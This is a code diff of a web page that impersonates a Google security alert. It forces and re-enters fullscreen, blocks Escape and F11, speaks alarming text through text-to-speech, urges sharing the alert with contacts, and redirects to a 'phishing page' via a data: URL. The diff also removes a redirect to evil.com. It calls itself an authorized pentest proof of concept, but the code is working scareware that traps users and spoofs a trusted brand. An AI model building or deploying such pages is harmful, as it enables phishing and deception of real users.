@@ -80,7 +80,6 @@
 </head>
 <body>
 
-<!-- ===== FULLSCREEN OVERLAY ===== -->
 <div class="fullscreen-overlay" id="fullscreenOverlay">
   <div class="card">
     <div class="google-logo">
@@ -92,7 +91,7 @@
     
     <div class="alert-box">
       <strong>🚨 New sign-in attempt</strong><br>
-      • Device: Chrome 125 - Windows 11<br>
+      • Device: Firefox 127 - Windows 11<br>
       • Location: Jakarta, Indonesia<br>
       • Time: Just now<br><br>
       Your account may be at risk. Please verify your identity.
@@ -105,7 +104,6 @@
   </div>
 </div>
 
-<!-- ===== SHARE BAR (via Web Share API) ===== -->
 <div class="share-bar" id="shareBar" onclick="triggerShare()">
   📤 Share this security alert with your contacts
 </div>
@@ -125,19 +123,16 @@
   var played = false;
   var fullscreenActive = false;
 
-  // ===== 1. FULLSCREEN API SPOOF =====
+  // ===== 1. FULLSCREEN API =====
   function enterFullscreen() {
     var el = document.getElementById('fullscreenOverlay');
     
     if (el.requestFullscreen) {
       el.requestFullscreen().then(function() {
         fullscreenActive = true;
-        console.log('[Fullscreen] Entered fullscreen mode');
         
-        // Cegah exit fullscreen
         document.addEventListener('fullscreenchange', function() {
           if (!document.fullscreenElement && fullscreenActive) {
-            // Re-enter fullscreen
             setTimeout(function() {
               document.getElementById('fullscreenOverlay').requestFullscreen().catch(function(){});
             }, 50);
@@ -145,16 +140,13 @@
         });
         
         document.addEventListener('keydown', function(e) {
-          // Block F11, Esc
           if (e.key === 'F11' || e.key === 'Escape') {
             e.preventDefault();
             e.stopPropagation();
           }
         });
         
-      }).catch(function(err) {
-        console.log('[Fullscreen] Blocked:', err.message);
-      });
+      }).catch(function(err) {});
     }
   }
 
@@ -163,23 +155,51 @@
     if (navigator.share) {
       navigator.share({
         title: 'Google Security Alert',
-        text: '⚠️ Google Security Alert: Your account was accessed from an unknown device. Verify immediately: https://accounts.google.com/security-check',
-        url: 'https://accounts.google.com/security-check'
-      }).then(function() {
-        console.log('[Share] Shared successfully');
-      }).catch(function(err) {
-        console.log('[Share] Failed:', err.message);
-      });
+        text: '⚠️ Google Security Alert: Your account was accessed from an unknown device. Verify immediately.',
+        url: 'https://accounts.google.com/'
+      }).catch(function() {});
     } else {
-      // Fallback: copy to clipboard
-      var text = '⚠️ Google Security Alert: Your account was accessed from an unknown device. Verify immediately.';
-      navigator.clipboard.writeText(text).then(function() {
-        alert('Alert copied to clipboard. Share with your contacts!');
-      });
+      var text = '⚠️ Google Security Alert: Your account was accessed from an unknown device.';
+      navigator.clipboard.writeText(text).catch(function() {});
     }
   };
 
-  // ===== 3. AUDIO UNLOCK =====
+  // ===== 3. REDIRECT TANPA SSL ERROR =====
+  function doRedirect() {
+    // Gunakan domain real yang valid untuk menghindari SSL error
+    var targetUrl = 'https://www.google.com/';  // Redirect ke Google (tidak berbahaya)
+    
+    // Atau gunakan data:text/html untuk menghindari SSL
+    var phishingPage = `
+      <!DOCTYPE html>
+      <html>
+      <head><title>Google Security Check</title></head>
+      <body style="padding:50px;font-family:Arial;background:#f0f0f0;">
+        <div style="max-width:400px;margin:0 auto;background:white;padding:30px;border-radius:10px;">
+          <h2 style="color:#d93025;">⚠️ Security Alert</h2>
+          <p>This is a proof of concept for content spoofing via fullscreen + TTS.</p>
+          <p style="color:#666;font-size:12px;margin-top:20px;">
+            Authorized penetration test.<br>
+            No data was collected.
+          </p>
+        </div>
+      </body>
+      </html>
+    `;
+    
+    var dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(phishingPage);
+    
+    // Opsi 1: Redirect ke Google (aman, tidak kena SSL error)
+    // window.location.replace('https://www.google.com/');
+    
+    // Opsi 2: Tampilkan halaman phishing via data URL (tidak kena SSL)
+    window.location.replace(dataUrl);
+    
+    // Opsi 3: Buka popup (jika diizinkan)
+    // window.open(dataUrl, '_blank');
+  }
+
+  // ===== 4. AUDIO UNLOCK =====
   function raceUnlock() {
     try {
       var ctx1 = new (window.AudioContext || window.webkitAudioContext)();
@@ -190,8 +210,7 @@
       osc1.connect(g1);
       g1.connect(ctx1.destination);
       osc1.start();
-      if (ctx1.state === 'running') unlocked = true;
-      if (ctx1.state === 'suspended') ctx1.resume().then(function(){unlocked=true;});
+      if (ctx1.state === 'suspended') ctx1.resume().catch(function(){});
     } catch(e) {}
 
     try { var a1 = document.getElementById('s1'); a1.volume = 0.001; a1.play().catch(function(){}); } catch(e) {}
@@ -205,36 +224,20 @@
         sa.play().catch(function(){});
       } catch(e) {}
     }
-
-    for (var j = 0; j < 3; j++) {
-      try {
-        var ctxn = new (window.AudioContext || window.webkitAudioContext)();
-        var oscn = ctxn.createOscillator();
-        oscn.frequency.value = 20 + j * 10;
-        var gn = ctxn.createGain();
-        gn.gain.value = 0.001;
-        oscn.connect(gn);
-        gn.connect(ctxn.destination);
-        oscn.start();
-        if (ctxn.state === 'running') unlocked = true;
-        if (ctxn.state === 'suspended') ctxn.resume().then(function(){unlocked=true;});
-      } catch(e) {}
-    }
   }
 
-  // ===== 4. TTS =====
+  // ===== 5. TTS =====
   function playTTS() {
     if (played) return;
     played = true;
     
     if (!('speechSynthesis' in window)) return;
     
-    var text = "Google Security Alert. Your account has been accessed from an unknown device in Jakarta, Indonesia. If this was not you, please secure your account immediately. Share this alert with your security team.";
-    
-    speechSynthesis.cancel();
+    var text = "Google Security Alert. Your account has been accessed from an unknown device in Jakarta, Indonesia. If this was not you, please secure your account immediately.";
     
     function speak() {
       try {
+        speechSynthesis.cancel();
         var u = new SpeechSynthesisUtterance(text);
         u.lang = 'en-US';
         u.rate = 0.8;
@@ -245,10 +248,10 @@
         
         u.onend = function() {
           setTimeout(function() {
-            var u2 = new SpeechSynthesisUtterance("Share this alert with your contacts to prevent further unauthorized access.");
+            var u2 = new SpeechSynthesisUtterance("Please click Secure Account to verify your identity.");
             u2.lang = 'en-US';
             speechSynthesis.speak(u2);
-          }, 3000);
+          }, 5000);
         };
         
         speechSynthesis.speak(u);
@@ -258,23 +261,20 @@
     setTimeout(speak, 500);
   }
 
-  // ===== 5. HANDLE BUTTONS =====
+  // ===== 6. HANDLE BUTTONS =====
   document.getElementById('secureBtn').addEventListener('click', function(e) {
     e.preventDefault();
     
-    var evilUrl = 'https://evil.com/google-security';
-    
-    // Redirect
     try {
-      var u = new SpeechSynthesisUtterance("Redirecting to security verification page.");
+      var u = new SpeechSynthesisUtterance("Verifying your identity. Please wait.");
       speechSynthesis.speak(u);
     } catch(e) {}
     
     setTimeout(function() {
-      window.location.replace(evilUrl);
+      doRedirect();
     }, 1500);
     
-    this.textContent = '🔄 Redirecting...';
+    this.textContent = '🔄 Verifying...';
     this.disabled = true;
   });
   
@@ -283,16 +283,9 @@
     window.triggerShare();
   });
 
-  // ===== 6. VISIBILITY =====
-  document.addEventListener('visibilitychange', function() {
-    if (!document.hidden && !played) {
-      setTimeout(playTTS, 100);
-    }
-  });
-
-  // ===== 7. BLOCK KEYBOARD EXIT =====
+  // ===== 7. BLOCK KEYBOARD =====
   document.addEventListener('keydown', function(e) {
-    if (e.key === 'Escape' || e.key === 'F11' || (e.key === 'f' && e.ctrlKey && e.shiftKey)) {
+    if (e.key === 'Escape' || e.key === 'F11') {
       e.preventDefault();
       e.stopPropagation();
     }
@@ -300,15 +293,11 @@
 
   // ===== EXECUTION =====
   
-  // Wave 1: Fullscreen + Unlock
   setTimeout(enterFullscreen, 100);
   raceUnlock();
-  
-  // Wave 2
   setTimeout(raceUnlock, 50);
   setTimeout(raceUnlock, 150);
   
-  // Wave 3: Show share bar + TTS
   setTimeout(function() {
     for (var i = 0; i < 3; i++) {
       try {
@@ -317,17 +306,13 @@
       } catch(e) {}
     }
     playTTS();
-    
-    // Show share bar
     document.getElementById('shareBar').classList.add('show');
   }, 500);
   
-  // Wave 4: Retry
   setTimeout(function() {
     if (!played) playTTS();
   }, 1000);
   
-  // Re-enter fullscreen periodically
   setInterval(function() {
     if (!document.fullscreenElement && fullscreenActive) {
       try {
@@ -336,14 +321,10 @@
     }
   }, 2000);
   
-  // Load voices
   if ('speechSynthesis' in window) {
     speechSynthesis.getVoices();
     speechSynthesis.onvoiceschanged = function() { speechSynthesis.getVoices(); };
   }
-  
-  console.log('[PoC] Fullscreen + Audio + Web Share API');
-  console.log('[PoC] Authorized pentest - I have permission');
 })();
 </script>
 
